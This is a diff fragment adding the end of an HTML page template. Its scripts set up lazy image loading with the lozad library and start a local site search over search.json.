+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
